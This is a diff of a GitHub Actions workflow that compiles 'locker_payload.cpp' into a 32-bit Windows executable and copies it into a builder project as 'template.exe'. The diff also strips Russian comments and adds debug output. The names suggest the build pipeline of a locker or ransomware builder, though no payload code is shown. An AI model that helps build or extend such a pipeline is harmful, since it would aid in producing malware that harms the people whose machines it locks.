@@ -13,11 +13,10 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v4
 
-    # --- ПРАВИЛЬНАЯ УСТАНОВКА 32-БИТНОГО MINGW ---
     - name: Set up MinGW (32-bit)
       uses: egor-tensin/setup-mingw@v3
       with:
-        platform: x86   # <-- Ключевой параметр для 32-битной сборки
+        platform: x86
 
     - name: Download NASM
       shell: cmd
@@ -46,18 +45,20 @@ jobs:
       with:
         dotnet-version: 6.0.x
 
-    # --- КОМПИЛЯЦИЯ БЕЗ ФЛАГА -m32 ---
     - name: Compile Template (32-bit)
       shell: cmd
       run: |
         cd template
         g++ -static -O2 -mwindows locker_payload.cpp -o locker_payload.exe -luser32 -lkernel32 -ladvapi32 -lshlwapi -lntdll
+        echo [DEBUG] Compilation finished, checking file...
+        dir locker_payload.exe
         if exist locker_payload.exe (
+          echo [SUCCESS] locker_payload.exe exists
           mkdir ..\builder\Resources 2>nul
           copy locker_payload.exe ..\builder\Resources\template.exe
-          echo [SUCCESS] Template compiled (32-bit)
+          echo [SUCCESS] Template copied to Resources
         ) else (
-          echo [ERROR] Compilation failed!
+          echo [ERROR] locker_payload.exe NOT FOUND!
           exit /b 1
         )
 
